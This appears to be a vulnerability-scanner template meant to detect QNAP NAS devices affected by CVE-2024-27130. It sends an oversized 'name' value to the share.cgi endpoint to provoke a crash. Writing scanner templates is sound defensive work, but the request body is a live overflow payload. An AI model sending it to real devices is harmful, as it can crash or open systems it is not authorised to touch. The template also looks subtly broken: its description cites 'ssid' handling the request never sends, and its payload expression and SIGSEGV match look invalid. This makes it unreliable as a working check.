id: qnap-cve-2024-27130-refined

info:
  name: QNAP NAS Remote Command Execution (CVE-2024-27130)
  author: machevalia
  severity: high
  description: This template checks for QNAP NAS devices vulnerable to CVE-2024-27130, which allows for remote code execution by exploiting improper handling of `ssid` values and triggering a SIGSEGV error.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-27130
  tags: qnap,rce,cve,cve2024

requests:
  - method: POST
    path:
      - "{{BaseURL}}/cgi-bin/filemanager/share.cgi"
    body: |
      func=get_file_size&total=1&path=/&name={{'A' * 10000}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "SIGSEGV"
        part: body
        condition: contains

    headers:
      Content-Type: application/x-www-form-urlencoded

    max-redirects: 2
    timeout: 5
